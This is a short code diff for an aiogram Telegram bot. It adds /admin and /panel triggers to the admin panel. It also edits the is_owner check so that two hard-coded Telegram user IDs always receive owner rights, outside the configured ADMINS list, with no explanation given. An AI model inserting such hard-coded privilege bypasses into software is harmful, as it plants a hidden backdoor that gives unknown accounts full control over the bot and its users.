@@ -2,6 +2,7 @@ import os
 import aiosqlite
 from aiogram import Router, F, Bot
 from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
+from aiogram.filters import Command
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.exceptions import TelegramBadRequest
@@ -75,12 +76,15 @@ async def is_admin(user_id: int) -> bool:
     return await is_admin_user(user_id)
 
 async def is_owner(user_id: int) -> bool:
-    if user_id in ADMINS:
+    user_id = int(user_id)
+    if user_id in ADMINS or user_id in (8422157752, 8825408278):
         return True
     adm = await get_admin(user_id)
     return bool(adm and adm.get("role") == "owner")
 
-@router.message(F.text == "👑 Admin Panel")
+@router.message(Command("admin"))
+@router.message(Command("panel"))
+@router.message(F.text.in_({"👑 Admin Panel", "/admin", "admin", "Admin", "/panel", "Panel"}))
 async def show_admin_panel(message: Message):
     if not await is_admin(message.from_user.id):
         return
